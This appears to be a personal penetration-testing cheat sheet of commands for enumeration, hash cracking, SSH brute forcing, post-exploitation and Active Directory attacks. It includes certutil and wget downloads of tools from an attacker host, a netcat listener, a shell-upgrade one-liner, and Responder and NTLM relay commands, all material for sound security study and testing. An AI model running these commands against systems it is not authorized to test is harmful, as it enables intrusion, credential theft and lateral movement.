## General

rm -rf /path/to/directory

## Enumeration  

ip a  

arp-scan -l

showmount -e [server ip]

mount -t nfs [server ip]:[remote path shown from showmount] [to local mount point]

nmap -sV -A -T4 -p- 

nmap -sV -A -T4 --top-ports 500 [target]

nmap --sC ? 

nmap -p- --script vuln [target]

nmap --top-ports 500 --script vuln [target]

gobuster dir -u http://[IPaddress] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -v | grep "Status: 200"

gobuster dir -u http://[IPaddress] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error

assetfinder example.com

assetfinder --subs-only example.com

python -V 

## Web Enumeration

Curl -I http://[target]

nikto -h http://[IPaddress:8080]

## DNS enumeration (workflow)

dig -x [IP]

nslookup [IP]

dnsrecon -r [IP range/24]

dnsrecon -r [target IP range/24 it belongs to] -n [targetIP]

## Cracking
Zip files: fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [target.zip]

NTLM# hash: hashcat -m 5600 file.txt /usr/share/wordlists/rockyou.txt --force

    ntlm# will dictate the specific module -m required to be set for the cracking.  
    in virtual machine intances --force may be required.  

hash-identifier

## Brute forcing
Hydra

nmap -p 22 --script ssh-brute --script-args="userdb=/path/to/username_wordlist.txt,passdb=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" 192.168.64.137


## Linux Post Exploitation
history

pwd

sudo -l

crontab -l

**Linux wget and curl commands**

wget http://192.168.64.137:8000/linpeas.sh -O linpeas.sh

🔼 Upgrading to an interactive shell using python  
python -c 'import pty; pty.spawn("/bin/bash")'

## Windows Post Exploitation
cd

whoami

ipconfig

dir

sc stop [application]

sc start [application]

sc query [application]

certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicationname.exe]

## Listener
nc -nlvp [port]

## Directory hosting
python -m SimpleHTTPServer

## Active Directory Attacks  

(Captures) LLMNR attacks  
sudo responder -I eth0 -dwv

(Relays) SMB attack  
sudo responder -I eth0 -dPv

(Relay authentication into targets | -i interacive shell | -c command execution)  
Impacket-ntlmrelax -tf targets.txt -smb2support -i 

**Identify hosts without SMB signing:** nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn  
In the event initial scanning of a known target presents no results adding -Pn will still scan the target and provide information regardless. 






